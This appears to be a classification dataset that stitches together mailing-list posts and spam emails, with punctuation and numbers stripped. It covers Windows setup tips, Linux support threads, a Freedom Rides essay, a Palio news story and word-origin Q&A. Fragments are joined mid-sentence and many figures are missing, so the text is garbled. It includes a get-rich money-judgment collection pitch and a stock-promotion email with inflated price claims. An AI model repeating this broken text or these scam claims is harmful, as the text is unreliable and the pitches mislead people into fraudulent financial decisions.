My Good EasyURL  http   diveintomark org archives            html my_good_easy Date            T                _Joe Gregorio_  My next pet project[ ]   Trying to re create the  Good  Easy[ ]  on a Windows machine   I have also made half hearted attempts in  this direction  as I am forced to use Windows during the day  I say  half hearted because I m still application centric  and I don t go as far with  keyboard shortcuts as I could  But I don t use the desktop at all  never have   on any system   and I don t use ctrl alt keyboard shortcuts because I  personally find them awkward  YMMV   If you must use Windows  the first step  towards a productive system is managing your Start menu    I use the main level of the Start menu with numbered shortcuts to my most  common programs     Control Panel[ ]      Mozilla[ ]      Emacs[ ]      DOS  home      DOS work      DOS incoming   each of which gives me a command line   but in different directories      Python[ ]      IE   Also    Explorer home       Explorer work      Explorer incoming   which open Explorer windows in  various useful directories  the same directories as the DOS shortcuts  only  with the shift key held down  and yes  I intentionally set it up so that   went  to my work folder   Less used programs are taken out of their useless submenus   as installed  and moved directly into the Programs submenu and given unique  first letters as needed   Ad aware[ ]    Excel[ ]    IM    Netscape  [ ]     Paint Shop Pro    Query Tool  ODBC [  ]    VMWare[  ]    Word[  ]   All other  submenus except Startup are removed from the Programs menu   Yes  delete   Accessories   Do you honestly ever use it  If so  it s probably a sign of a  larger productivity problem   Things which never need to be run manually  like  WinZip and Quicktime  are removed from the Programs menu  Maintaining a clean  Programs menu is an ongoing struggle  but well worth it    On most modern keyboards  there is a key next to your left alt key that opens  the start menu  which you can press with your left thumb without taking your  fingers off the home keys  Otherwise ctrl esc always works  Menu   gives me a  new command prompt in my work directory  Menu P N runs Netscape    for  compatibility testing in my day job  ugh   Mozilla and Emacs are almost always  open  but I quit lesser used applications as soon as I m done using them   mostly because my laptop doesn t have a lot of memory     I install Cygwin[  ] so that the command line is actually useful  Cygwin is a  collection of Windows ports of all your favorite UNIX utilities  including mv   cp  scp  ssh  man  tar  less  grep  patch  ncftp  cvs  and many others  And  bash  which I don t use because I dislike how it handles Windows pathnames  I  also set the properties of my command line shortcuts to set the window size to      x     almost full screen at      x       and screen buffer size to     x        Set window position at   x    and don t let the system position the  window    In Mozilla  I set my home page to  about blank   set Internet Search to search  with Google  use Tabbed Browsing  open tabs instead of windows in all possible  cases  always show the tab bar  and load links in the background  essential for  weblog surfing  you can ctrl click links to open them in new tabs in the  background   Under Scripts   Plugins  I do not allow scripts to open  unrequested windows  I turn off the sidebar  turn on the Site Navigation Bar   delete all pre installed bookmarks  and create two bookmarks  one which takes  me to my webmail  and another which takes me to my internal site search[  ]   from which I can find all other bookmarks I need    In Internet Explorer  I set my home page to the page to edit my weblog  since  that s the only thing I do in Internet Explorer  alt tab back and forth between  Mozilla and IE is easier than ctrl pgup pgdown between tabs within Mozilla   since TEXTAREAs in Mozilla lose focus when you switch tabs  making copying and  pasting weblog entries virtually impossible    I use Emacs locally and vi remotely  because the default behavior of Emacs is  so heinous as to render it unusable   For instance  editing a CGI script named  foo cgi on a web server with Emacs would generate a foo cgi  backup file  which  is world readable and is sent as plain text to any browser that asks  Try this  sometime on your favorite web site   Among other things  my  emacs file  which  is actually called _emacs on Windows  instructs Emacs to store all backup files  in a single directory  d \backup   to treat all XML files as DocBook  all CGI  scripts as Python  and all SQL scripts as PL SQL  to use Cygwin s bash shell  for M x shell  to use a single maximized frame with no menubar  titled as the  name of the current file  to show column numbers  to accept  y  and  n  for  yes no questions  not to blink  not to beep  and to close the current file when  I press M w  I use some weird registry hacks and a hacked notepad exe to get  all text files to open in Emacs   I got this idea from Ultraedit[  ]   My  _emacs file is my second most backed up possession    I don t use Windows  useless directory structure for user home directories  On  my D drive I have d \home  contains directories for my books and other personal  projects  each under CVS control also set as my home directory using the  HOME environment variable   d \work  contains directories for each work  project  also under CVS   d \incoming  set as default download directory for  all programs that download things   and d \backup  used by Emacs  and for  temporary storage  for instance for storing originals when checking out newly  created CVS projects   I don t know or care what s where on my C drive    I have tried many  many address books  and still store all my contacts  email  addresses  snail mail addresses  phone numbers  and other vital personal  information in a text file called phone  stored in d \home\phone  It is not in  any particular format  other than being plain text and usually including blank  lines between entries  I categorize people with simple keywords in parentheses  after their name  and use M x occur in Emacs to search by keyword  This file is  my single most backed up possession    Other essential free Windows utilities I use  in no particular order   TweakUI [  ]  Cygwin[  ]  Guidescope[

Re  Al Qaeda s fantasy ideology  Policy Review no      There is a hot dispute about the original size of the indigenous  population  but the evidence for a high density in the Mexican area is  sound   It was up here in the North or in the Amazon where I m a little  more suspicious of very high upward revisions   Right  there was definitely a relatively high density in Mexico  and much less elsewhere   Population estimates vary wildly and about all your average skeptic can do is take geometric means to get ballpark figures   While Central America may have had    or    million  vast areas of South America were uninhabited and other places very sparsely e g   the plains Indians in what is now the U S  may have been   million or so   There are those who claim that the Mexican population declined from    something million to circa   or    million in the   th century  certainly  in part due to infectious diseases new and old  and other factors  and was probably in decline before contact   Others claim it declined from    ish million to   or   million and somehow deduce     mortality from imported diseases  and have a pretty clear agenda which makes me  for one  take their claims with a large grain of salt   About all that is certain is that anyone alive in      was dead in       in the Americas or elsewhere   R http   xent com mailman listinfo fork  ,1

Re  Microsoft buys XDegress   more of a p p distributed data thing   Mr  FoRK writes     Files can be cached on multiple systems randomly scattered around the   Internet  as with Napster or Freenet  In fact  the caching in XDegrees is   more sophisticated than it is on those systems  users with high bandwidth   connections can download portions  or  stripes   of a file from several   cached locations simultaneously  The XDegrees software then reassembles   these stripes into the whole file and uses digital signatures to verify that   the downloaded file is the same as the original  A key component of this   digital signature is a digest of the file  which is stored as an HTTP header   for the file    This  more sophisticated than [Napster or Freenet]  part seems to be the same behavior implemented in many other P P CDNs   such as       Kazaa     EDonkey Overnet     BitTorrent     Gnutella  with HUGE extensions      OnionNetworks WebRAID     though the quality of the  digest  used by each system varies wildly     Gordon    ,1
Debian style task packages for RH    availableHi   This has been hashed over a few times on various lists  now I finally got  around to doing something about it    You can now add  rpm http   koti welho com pmatilai  redhat     task  to your sources list  and after apt get update you can find out what s available with   apt cache search ^task    These are generated directly from comps xml of RH    so they contain  exactly the same packages as you ll get by choosing the various categories  at install time  I didn t bother including SRPMS for these as they are  rather uninteresting  if you want you can re generate the  specs by  running http   koti welho com pmatilai comps task comps task py   BTW the repository only contains the task packages  you ll need an  apt enabled mirror of RH    in your sources list to actually do anything  with it          Panu        _______________________________________________ RPM List mailing list  http   lists freshrpms net mailman listinfo rpm list   ,1

The Freedom Rides By Denis Mueller  At the end of World War II  the United States was a rigidly  segregated country but there were cracks beginning to show   In       the Supreme Court ruled that ruled that segregated  seating on interstate transportation was illegal  In        the Congress of Racial Equality  CORE  decided to challenge  the racist system  The opposition was fierce and the riders  were jailed often ending up on chain gangs   By       the time was right to challenge America s Jim Crow  laws and CORE proposed the  Freedom Rides   CORE felt that  they could count on the racists to oppose the rides thereby  creating a crisis that would force the Federal Government to  intervene to enforce the law  It would be dangerous and CORE  members knew that they were risking their lives  but as CORE  director James Farmer maintained they were ready    When we  began the ride I think all of us were prepared for as much  violence as could be thrown at us  We were prepared for the  possibility of death                                                                                   S E X   S E X   S E X   S E X               NOW THAT WE VE GOT YOUR ATTENTION

an angry band of terrorists who  slashed the tires and burned the bus  In Birmingham it was  worse  The FBI  through its informant James Rowe  were well  aware that the Ku Klux Klan was waiting for them  So were  the Birmingham police  led by Chief of police Bull Conner   and when they arrived they were severely beaten    Despite the warnings there were no police to protect them   Governor Patterson showed no mercy and blamed the riders   So the terrorist attacks went on  The  Freedom Riders  were  determined to continue and were joined by a group of Nash  ville students  They were met by hostility and were arrested  and sent back to Tennessee  But the riders were fearless and  immediately returned to Birmingham ready to continue the  journey

plight became international news and   Freedom Riders  left Birmingham on May   th determined to  continue  State officials had promised Attorney General Robert  Kennedy they would be protected  but by the time they reached  Montgomery there were no state police in sight  Seeing a mob   the riders feared for their lives  but Jim Zwerg  a white man   bravely walked out of the bus and was nearly beaten to death   He still suffers from the effects but his courage was un  deniable  Others including Justice Department official John  Seigenthaler were also beaten   The situation seemed to be out of control and federal inter  vention finally saved the day with Governor Patterson declar  ing martial law  Robert Kennedy called for a cooling off  period but the riders refused  They would continue on  So  they set off to Jackson  Mississippi but  Kennedy had made a  deal with Mississippi officials  They were supposed to be  protected  but upon arriving they were arrested  Kennedy had  caved in  It was a cowardly decision by the Attorney General  and the riders were sentenced for    days for exercising  their constitutional rights  They never finished their trip  but their courage showed the power of civil disobedience and  in the end justice would prevail and terrorism would be  defeated  It is another example of how people change things   not government officials   Sources  Eyes on the

Re  [ILUG] PCTel modulesOn               Thu  Sep          at         PM         eric nichols wrote    Hello again  I tried all the suggestions for the PCTel driver and at   the end of it  everything still goes smoothly until I type  make    after I get the output from the   configure        However  there were a couple of things I noticed along the way  After typing      cp configs kernel       config  config     make oldconfig     make dep   The  nd to last line I got back said that the modversions h file was   not updated  When I looked at this path to the modversions h file  it   was     lines and every line started with a   mark    Is it the case   that nothing is read on a line after a   mark  or am I just thinking   of another language   and so should I delete the   at certain places  No that is appropriate content for the file   I m not a C programmer  but I think that these sort of things   include   are instructions to the compiler processed by a pre processor in the compile process  and include all sorts of symbols functions e g    include   gives you maths type functions   Since they start with     they are ignored in the final compilation   Regarding the rest of the compile process  you need to tell the PCtel software to look in the right place for the kernel headers source   I recall from your previous mail that there was a flag       with kernel includes  usr src linux     which could be passed to the   configure script  with the appropriate directory in place of  usr src linux        This might allow you to persuade the code to compile against the correct headers   I think this is the right way to proceed   Alternatively  maybe the steps above regarding  make dep  and so forth should have been performed in the directory where the make process is looking for modversions h   Co   I don t think it is a good idea keep moving files into the directory as you describe below   First of all you will move modversions h  which you have done   then you would have to move all those   ver files  after that  there will almost certainly be a need for further header    h  files   This could be quickly done  but is probably bad  those files don t really belong there    For what it s worth I think you are very close to a successful compilation   m       Also  when I was in the pctel directory and typed  make   I noticed   that a different subdirectory is taken to a different modversions h   file  Inside this other file  there s nothing at all  And so I moved   the modversions h file with     lines to the empty modversions h file     and got a different reply after  make   The output after I moved the   file over mostly looked like this     usr src linux          linux modversions h          linux modules adb ver  No such file or directory    usr src linux          linux modversions h          linux modules af_ax   ver  No such file or directory    usr src linux          linux modversions h          linux modules af_ipx ver  No such file or directory      The odd lines being the path and the first half of the other lines are   what s written after the   in the modversions h file  Should there be   a file at each of these  one at each of the     lines of the file    that I d have to compile make       Michael Conry   Ph                  Web  http   www acronymchile com Key fingerprint        B          C   A     CB      B        DE    C      Irish Linux Users  Group  ilug linux ie http   www linux ie mailman listinfo ilug for  un subscription information  List maintainer  listmaster linux ie   ,1

Judicial Judgements Child Support                  BGS xXxX  xXxXxXxXxXxXxXxXxXxXxXThank  b  you for your interest   Judgment Courses offers an extensive training course in  How to Collect MoneyJudgments   If you are like many people  you are not even sure what a Money Judgment is and why processing Money Judgments can earn you very substantial income    If you ever sue a company or a person and you win then you will have a Money Judgment against them   You are happy you won but you will soon find out the shocking fact   Its now up to you to collect on the Judgment   The court does not require the loser to pay you  The court will not even help you  You must trace the loser down  find their assets  their employment  bank accounts  real estate  stocks and bonds  etc   Very few people know how to find these assets or what to do when they are found  The result is that millions of Judgments are just sitting in files and being forgotten    In     of the cases the winner of a Judgment never sees a dime    The non payment of judicial debt has grown to epidemic proportions  Right now in the United States there is between     and     billion dollars of uncollectedMoney Judgment debt   For every Judgment that is paid   more Judgments take its place   We identified this massive market   years ago and have actively pursued Judicial Judgments since  We invented this business  We have perfected it into a well proven and solid profession in which only a select few will be trained in the techniques necessary to succeed   With our first hand experience we have built a course which teaches you how to start your business in this new unknown and exciting field of processing Money Judgments   By following the steps laid out in our course and with reasonable effort you can become very successful in the processing of Money Judgments   The income potential is substantial in this profession  We have associates who have taken our course and are now working full time making            to over             per year  Part time associates are earning between            and             per year   Some choose to operateout of their home and work by themselves  Others build a sizable organization of    to    people in attractive business offices   Today our company and our associates have over     million dollars in Money Judgments that we are currently processing  Of this     million     million is in the form of joint ventures between our firm and our associates  Joint ventures are where we make our money  We only break even when our course is purchased  We make a     margin on the reports we supply to our associates  Our reporting capability is so extensive that government agencies  police officers  attorneys  credit agencies etc   all come to us for reports    Many of our associates already have real estate liens in force of between   million to over    million dollars  Legally this means that when the properties are sold or refinanced our associate must be paid off  The norm is     interest compounded annually on unpaid Money Judgments  Annual interest on   million at     translates to             annually in interest income  not counting the payment of the principal   Our associates earn half of this amount or             per year  This is just for interest  not counting principle and not counting the compounding of the interest which can add substantial additional income  Typically companies are sold for    times earnings  Just based on simple interest an associate with   million in real estate liens could sell their business for approximately     million dollars       of all of our associates work out of their home      are women and     are part time    One of the benefits of working in this field is that you are not under any kind of time frame  If you decide to take off for a month on vacation then go  The Judgments you are working on will be there when you return  The Judgments are still in force  they do not disappear   The way we train you is non confrontational  You use your computer and telephone to do most of the processing  You never confront the debtor  The debtor doesn t know who you are  You are not a collection agency   Simply stated the steps to successful Money Processing are as follows   Mail our recommended letter to companies and individuals with Money Judgments   We train you how to find out who to write to      to     of the firms and people you write will call you and ask for your help  They call you  you don t call them unless you want to   You send them an agreement  supplied in the course  to sign which splits every dollar you collect     to you and     to them  This applies no matter if the judgment is for           or                 You then go on line to our computers to find the debtor and their assets  We offer over     powerful reports to assist you  They range from credit reports from all three credit bureaus  to bank account locates  employment locates  skip traces and locating stocks and bonds  etc  The prices of our reports are very low  Typically     to     of what other firms charge  For example we charge       for an individuals credit report when some other companies charge          Once you find the debtor and their assets you file garnishments and liens on the assets you have located   Standard fill in the blanks forms are included in the course   When you receive the assets you keep     and send     to the original Judgment holder   Once the Judgment is fully paid you mail a Satisfaction of Judgment to the court   Included in the course   Quote s from several of our students   Thomas in area code     writes us   I just wanted to drop you a short note thanking you for your excellent course  My first week  part time  will net me          dollars  Your professionalism in both the manual and your support    You have the video opened doors for me in the future   There s no stopping me now  Recently Thomas states  he has over            worth of judgments he is working on   After only having this course for four months  Larry S  in area code     stated to us   I am now making           per week and expect this to grow to twice this amountwithin the next year  I am having a ball  I have over          in judgments I am collecting on now   After having our course for   months Larry S  in     stated  I am now making            per month and have approximately             in judgments I am collecting on  Looks like I will have to hire someone to help out   Marshal in area code     states to us  I feel bad  you only charged me         for this course and it is a goldmine  I have added   full time people to help me after only having your course for   months    From the above information and actual results you can see why we can state the following   With our course you can own your own successful business  A business which earns you substantial income now and one which could be sold in     years  paying you enough to retire on and travel the world  A business which is extremely interesting to be in  A Business in which every day is new and exciting   None of your days will be hum drum  Your brain is Challenged  A business  which protects you from Corporate Downsizing  A business which you can start part time from your home and later  if you so desire  you can work in full time  A business  which is your ticket to freedom from others telling you what to do  A business  which lets you control your own destiny  Our training has made this happen for many others already  Make it happen for you   If the above sounds interesting to you then its time for you to talk to a real live human being  no cost or obligation on your part   Please call us at    ` `   ` `   ` ` `    We have Service Support staff available to you from     am to      pm  Central Time    days a week   If you callthis num  ber you can talk to one of our experienced Customer Support personnel  They can answer

Re  [ILUG] slashdot EW Dijkstra humor  Interesting  I ve always wondered about things  considered  to be bad     Example the GOTO  most languages support a goto of some sort  so are gotos really bad   Oh goodie  My final year project rears its head        Is a loop or a recursive call actually any better than a goto    or is the goto used as a kind of common enemy of    programming syntax  Much as I would like to answer an unqualified  yes   I must admit  if  you already code in a style that makes heavy use of GOTOs  coding in the  same style with GOSUBs or function calls does not improve code  Much the  same as when the manuals on  modular coding  said to write modules that  would fit on a single sheet of computer paper  lots of coders proceeded  to split their code into arbitrary    line chunks      However   Go to considered harmful  points out that to analyse    debug   code  you need to be able to tell what the point of execution is  and  what the values of the variables are at that point  This is an easy tm   job if the code uses assignment  if    for   and functions  but not if  it uses GOTO   See http   www cs utexas edu users EWD ewd  xx EWD    PDF  for the full letter    Despite being one of Dijkstra s brain damaged children who learned BASIC  at an early age    I never use GOTO anymore  or any of its bastard  offspring like break  continue  fudged function calls with sleight of  hand in the variables   My code is longer than it might be if I had used  GOTO at a critical  handy point  However  code is a bit like networks    you always end up adding bits on where you didn t expect to   and the  benefit is felt when another person  like myself but in three months  time  is modifying or debugging it and doesn t have to go through the  hassle of dealing with the impact of the GOTO   Dave       Irish Linux Users  Group  ilug linux ie http   www linux ie mailman listinfo ilug for  un subscription information  List maintainer  listmaster linux ie   ,1

Dragon Player bad AVI audioI m running Debian Testing on two computers  and Dragon Player has   terrible audio when I play AVI files  but only on  one  of the   computers   It has a lot of noise   hiss over top of the regular audio     Both computers have the same packages installed  thus it must be a   hardware difference   The computer with normal audio is a laptop running   the built in speakers   The computer with the bad audio is a tower   playing the audio through USB speakers  built into my monitor      Interestingly  mplayer gives ok audio on both computers  and codeine    which I understand is the KDE  version of Dragon Player  also gives ok   audio on both computers     All other audio applications work fine on both computers  youtube    Skype  system notifications      Has anyone else encountered this problem     Glen Reesor           To UNSUBSCRIBE  email to debian kde REQUEST lists debian org  with a subject of  unsubscribe   Trouble  Contact listmaster lists debian org  Archive  http   lists debian org  BC A            telus net      ,1

growth in sales is primarily due  to the EUOK brand becoming more established in the  premium cosmetic channels                    EUOK current trading price of      is a steal   We have been following the cosmetics and beauty industry now for quite some  time  According to Forbes com who did an article on the growth of the  cosmetics industry  beauty products generate nearly     billion annually  in global sales  with a consumer  preference placed on products that are high tech and natural based  favoring  companies like EUOK   With the current status of the company   EUOK is  poised to grab no less than    of global sales  ensuring     million in gross sales for  EUOK  Based off revenue alone that would warrant a       share  price                  The  financials speak for themselves  EUOK is set to make a run and is extremely undervalued                  In  the past  large  multinational corporations have dominated the market place  but in recent  years boutique brands such as EUOK have been at the fore front of consumer  spending  EUOK is ready to take full advantage of this   Data released from the NPD Group  a marketing info company based in New  York  says luxury cosmetics  have grown at an annual rate of         since       Estee  lauder and  L Oreal have realized this and have been  acquiring companies like  EUOK in order to meet the demand of  consumers         There  are several reasons behind the growth in high end cosmetics  the expansion  of new markets in Russia and Asia  changing social norms that make  using cosmetics  not to  mention undergoing cosmetic surgery  more acceptable  celebrity worship   promotion within fashion magazines  improvements in the technology that  creates makeup  the influence of mass retailers that can offer lower prices   and raising affluence  As cosmetics becomes less expensive  better and more  accessible  more affluent women  and increasingly men as well  have moved  away from older brands of makeup and skincare in search of higher quality  new products and more exclusivity          EUOK recognizes this and has gained retail  distribution worldwide  through its relationships with department store retail giants such  as Barneys New York  Saks Fifth Avenue  Bergdorf Goodman  Neiman Marcus   Bliss  Harrods  London   Printemps  France   La Rinascente  Italy  and Lane  Crawford  Hong Kong          Upper management of EUOK has a three prong approach to further drive  global brand recognition                  North America     EUOK strategy  in North America is one of strong luxury brand positioning through  partnerships with premier department stores and flagship locations   EUOK  department store partners include Bergdorf Goodman in New York City  Barneys  New York nationwide  Ogilvy  as well as boutique style department stores  across USA and Canada  EUOK also operates brand owned flagship stores  in Toronto and Vancouver  EUOK subsidiary  Hewitt Vevey  is positioned in  medical facilities and online  with p  lans to grow in both directions  Future expansion plans include creating  new partnerships with other major department stores  as well as positioning  with   star hotels in key markets           Europe     EUOK  distribution in Europe varies by market but is restricted to luxury channels  that position the brand amongst the leading luxury skincare brands  Our  representation includes department stores and perfumeries in major markets   These channels include Printemps in France  Harrods and Liberty in the UK   La Rinascente in Italy  as well as perfumeries in other countries  Expansion  plans for Europe are focused primarily in the UK and France with  negotiations with premier department stores under way

Re  use new apt to do null to RH  upgrade   Matthias Saou  matthias egwn net  wrote      As Red Hat does  I really don t recommend trying to upgrade between betas    or from a beta to a final release either  Simply backup your  home   etc     and  root and or  usr local  if needed  then reinstall cleanly  it ll    probably save a few hassles and you ll get the cleanest possible system          I think this is probably the best way  because I think  maybe  with upgrading you   do not always automatically get the latest feature enabled in some config file   because RH would rather take it easy and not update that config file  you get a   rpmnew instead of rpmsaved file  so they get less calls to support that way   If you dislike Red Hat  why use it   This was a really bad argument  against using Red Hat that makes no sense at all   I for one am GLAD that  they  a  don t overwrite your config files on a whim  be GLAD they don t do some  sort of autodetection and changing crap  b  tell you on rpm upgrade what config files you should look at because  formats have changed   Red Hat is not  taking it easy  on this  it s putting control in the hands  of you  the maintainer of the machine   Don t be lazy     Anyway  I have tons of media files in  home   probably   to    gigs at least  my   laptop s CDROM takes    MB at a time  obviously  and compressing media files is   dumb because they are already compressed  Dumb question  how to backup huge data    Network backup to another box  I do not have a box with a tape drive  but maybe box   with a large HD with much free space could take the backup  oops  I do not have a   space computer with a large HD with much free space    You don t need to backup  home if you are careful enough   You did put   home on a separate partition  no   Just install rh   and tell it to use  the same partition as  home and tell it to NOT format it  but keep the  data as is   If you didn t put  home on a separate partition  then you really do need  to make backups   Use an nfs or smb mount from another machine to backup  and rsync straight to the mount  or if that s not possible  rsync over  ssh   It s the best way to make backups     These media files are backed up   ON THE CD S THEY CAME FROM    It s the other way around   your media files are backups of the CD s they  came from     Good luck  Thomas      The Dave Dina Project   future TV today     http   davedina apestaart org   You know the shape my breath will take before I let it out  URGent  the best radio on the Internet            http   urgent rug ac be    _______________________________________________ RPM List mailing list  http   lists freshrpms net mailman listinfo rpm list   ,1

[zzzzteana] Six arrested for attacking Palio jockey who defectedThe Electronic Telegraph   Six arrested for attacking Palio jockey who defected   By Bruce Johnston in Rome   Filed                    Police waded into the intrigues and enmities surrounding the Palio  Siena s  traditional bareback horse race  for the first time yesterday  arresting six  people for beating up a star jockey who defected to a rival team       Angry spectators attack Giuseppe Pes at the Palio horse race in Siena   Giuseppe Pes  a champion jockey of Sardinian extraction who has won the Palio  nine times in    runs  was closely associated with the Istrice  or Porcupine   contrada   section of town   until the race earlier this month     Istrice did not have a horse in the contest   only    of the    contradas take  part in each Palio   but  despite promises to the contrary  moments before the  off Mr Pes mounted the horse of Lupa  or She Wolf     Lupa are Istrice s historic rivals  and the defection was not taken well  Lupa  did not win  victory going instead to Tartuca  tortoise     As its supporters erupted into joyous celebrations  Mr Pes was pulled from his  mount by Istrice members and savagely beaten and kicked for seven minutes     Mr Pes      whose jacket with his contrada s colours was torn from his back   was sent to hospital with fractures  cuts and bruises     Three of his attendants who tried to intervene were also beaten  Police  yesterday arrested six people they said had been identified as the attackers  from video footage     Experts said it was the first time that members of a contrada   known as  contradaioli   had been arrested for beating up a jockey  despite the fact  that such episodes belong to the race s ancient traditions     The Palio  which was first raced in the   th century  is held twice a year on  the cobbles of Siena s main square  For weeks beforehand supporters parade  through the city  singing  waving flags and wearing their contrada colours   But by the day of the race the good humour evaporates     The event has no rules and is prepared for and run amid an extraordinary  undercurrent of intrigue and even violence  Jockeys may swap sides at the last  minute  take bribes  and whip rivals  horses  and more  so long as they do not  grab their reins     The origins of the contrada lie in the Middle Ages  when the neighbourhoods   boundaries were set out to aid the many mercenary companies hired to defend  Siena s fiercely earned independence from Florence and other city states     The first Palio of the year takes place on July    to commemorate the miracles  of the Madonna of Provenzano  and a second race on Aug    marks the feast of  the Assumption of the Virgin                             Yahoo  Groups Sponsor                             DVDs Free  s p Join Now http   us click yahoo com pt YBB NXiEAA MVfIAA  gSolB TM                                                                           To unsubscribe from this group  send an email to  forteana unsubscribe egroups com     Your use of Yahoo  Groups is subject to http   docs yahoo com info terms      ,1

looked like pyramids  However  in recent years  especially in countries like Britain and the US  the number of children per generation has steadily gone down  while life span has increased  This has led to a shape of family tree that some researchers have likened to a beanpole   tall and thin  with few people in each generation  The term  beanpole family  has been around in the academic literature at least since       but it rarely appears elsewhere  A recent British report has brought it to wider public notice  at least in the UK  Some researchers find it too slangy and prefer the jargon term  verticalised  to describe such families  Whatever term you prefer  specialists are sure that the demographic shift is having a big effect on personal relationships within the family and  for example  the role of grandparents   The rising divorce rate partly explains the growth of the  beanpole  family  With almost one in two marriages ending in divorce  many adults have at least two families  each with a single child                                               [ Observer   May     ]  Noting the rising number of so called  beanpole  families in Britain  families with only one

person  a blockhead   Unfortunately  this useful and effective insult has rather dropped out of use in these mealy mouthed times  The last excursion for it that I can find is in the classic W C Fields

local railway station      Caution    Do not run on the stairs    Use the hand rail      Q A                                                                     Q  For my job I have to read American magazines concerning consumer electronics  home systems  burglar alarms  etc  I very often come across the expression  bells and whistles   which seem to relate to equipment  accessories or features that are offered to the customer as plusses but are not really indispensable for the device to work  Is that right  And where does that funny phrase come from  [Herve Castelain  France]  Q  You re right about the meaning of this phrase  which refers to gimmicks   non essential but often engaging features added to a piece of technical equipment or a computer program to make it seem more superficially attractive without enhancing its main function   The phrase is actually quite modern and may be a product of the American military  At least  one of its earliest appearances was in an article in  Atlantic  in October       which said it was  Pentagon slang for extravagant frills   There s some evidence that the term has actually been around since the     s  but the early evidence is sparse   Where it comes from is still a matter of learned debate  A literal sense of the phrase appeared around the middle of the nineteenth century  referring to streetcars  railways and steamships  Before modern electronics  there were really only two ways to make a loud warning noise   you either rang a bell or tooted a whistle  Steam made the latter a real power in the land  anybody who has heard the noisy out of tune calliope on the steamboat Natchez at New Orleans will agree about its power  though less so about its glory   And at one time  clang  clang  clang went the trolley  in large numbers of American cities   At least some early US railroad locomotives had both bells and whistles  as this extract from an article in  Appleton s Journal  of      shows     You look up at an angle of sixty degrees and see sweeping   along the edge of a precipice  two thirds up the rocky   height  a train of red and yellow railway cars  drawn by   two wood burning engines  the sound of whose bells and   whistles seems like the small diversions of very little   children  so diminished are they by the distance   Could it be that to have both bells and whistles was thought excessive  a case of belt and braces  an unnecessary feature  a frill   Possibly  But it s more probable the slang sense of the term comes from that close musical relative of the calliope  the theatre organ  Extraordinary instruments such as the Mighty Wurlitzer augmented their basic repertoire by all sorts of sound effects to help the organist accompany silent films  among them car horns  sirens  and bird whistles  These effects were called toys  and organs often had  toy counters  with    or more noisemakers on them  including various bells and whistles  In the     s  decades after the talkies came in  but while theatre organs were still common in big movie houses  these fun features must have been considered no longer essential to the function of the organ but mere fripperies  inessential add ons   It s possible the slang sense grew out of that  It got taken up especially by the computing industry  perhaps because opportunities to add them are so great                                        Q  The designation of  robes  for academic dress clearly comes from its origin with the clergy in the Middle Ages  But what about  mortarboards   The best I could find was its origin in the   th or   th century clergy cap  but that was not square shaped  Does  mortarboard  refer to the guilds or is its origin more ancient   A  The academic cap often called a  mortarboard  is quite ancient  but that word for it only dates from the middle of the nineteenth century  a less slangy way to identify it is to call it a  square    The literal mortar board is the wooden plate  usually with a handle underneath  on which bricklayers carry small amounts of mortar  A similar tool is used by plasterers  but they usually call it a hawk   What seems to have happened is that the similarity in shape between the brickie s board and the academic cap led some wag  probably at Oxford University  to apply the name of the one to the other  Our first recorded use is in a book of          The Adventures of Mr  Verdant Green  an Oxford Freshman  by a clergyman named Edward Bradley  who wrote under the pen name of Cuthbert Bede  the names of the two patron saints of Durham  where he went to school   Verdant Green is a sort of undergraduate Pickwick and the book recounts his adventures  This magisterial reprimand by a don appears after one such escapade   I will overlook your offence in assuming that portion of the academical attire  to which you gave the offensive epithet of  mortar board   more especially  as you acted at the suggestion and bidding of those who ought to have known better    After a slow start  the book became a huge success  selling more than         copies in the next    years  Whether Mr Bradley invented the slang term we may never know  but his book certainly popularised it                                        Q  I got into a discussion about  chip off the old block  with friends  and we are wondering if it had to do with sculpting  jewelry making  woodworking  or none of the above  What does this term mean  and where did it come from  [Vijay Renganathan]  A  The associations are with carpentry  and the block is definitely made of wood   The first form of the expression was  chip of the same block   meaning that a person or thing was made of the same stuff as somebody or something else  so from the same source or parentage  An early example is in a sermon by Dr Robert Sanderson  at one time Bishop of Lincoln   dated        Am not I a child of the same Adam     a chip of the same block  with him     Later that century  another form is recorded  a chip of the old block   which meant that somebody was the spitting image of his father  or continued some family characteristic  At some point  probably late in the nineteenth century  this was modified to  a chip off the old block   which does nothing to change the sense  but is the way it s now usually written or said       Endnote

Configuration errors using tor  privoxy   polipoDear all    On an up to date testing machine  I am using Iceweasel   tor   privoxy     Florian helped me with an issue like this sometime back  but revisiting   his helpful advice has not helped on this occasion     The situation is as follows     Using Iceweasel  I enable the tor button and receive a warning message    Tor proxy test  local HTTP proxy is unreachable  Is polipo running   properly      Well  no because polipo wasn t installed   why and when this suddenly   became a necessity I don t know  but anyway I installed polipo and   configured it according to the tutorial on   http   wiki archlinux org index php Polipo which  in my circumstances    required me to uncomment this line in the config file              socksParentProxy   localhost         Having restarted the daemons  and still getting the same error and no   connection  I pointed the browser at privoxy as per the polipo   configuration page referred to above  in the preferences  network   settings tab  and in the polipo config file  I uncommented the line              socksParentProxy   localhost         I then restarted polipo  double checked the privoxy config file to   ensure that forwarding was still set as required and restarted the tor   and privoxy daemons   However  I still get the same error messages    basically cannot connect to web pages  and the tor test gives the same   results as before      From researching this on the web  I am unable to ascertain whether or   not I even need polipo  but the preferences settings tab for the tor   button have a check box for using polipo  so it appears as if tor is now   expecting polipo to be installed and running as default   But  I have   now reached the limit of what I know what to do or can figure out   I am   also conscious of the risk of screwing things up further in an effort to   fix this  so before proceeding further would like to ask this list for   help and advice     I appreciate any thoughts  ideas     Thanks    AG           To UNSUBSCRIBE  email to debian user REQUEST lists debian org   with a subject of  unsubscribe   Trouble  Contact listmaster lists debian org  Archive  http   lists debian org  BEFA          csmining org      ,1

[Razor users] razor vs cloudmark   merging I am somewhat puzzled by a phone call I  or rather the CIO at the ISP for whom I work  received from an individual claiming to represent Cloudmark  The gist of the call was that since we were using razor and checking our mail against the razor servers and that since those servers contain information proprietary to Cloudmark  we would [in the near future ] be required to begin paying Cloudmark spamnet       user per year  I was wondering if anyone else has received such a call   I am curious as to whether a spammer has begun to try contacting razor users with the above tactic in an effort to get them to stop using razor or whether the open source community aspect of the razor project is going by the wayside in lieu of a strictly commercial approach  ala brightmail and the likes    Sven                                                            This sf net email is sponsored by ThinkGeek Welcome to geek heaven  http   thinkgeek com sf _______________________________________________ Razor users mailing list Razor users lists sourceforge net https   lists sourceforge net lists listinfo razor users   ,1

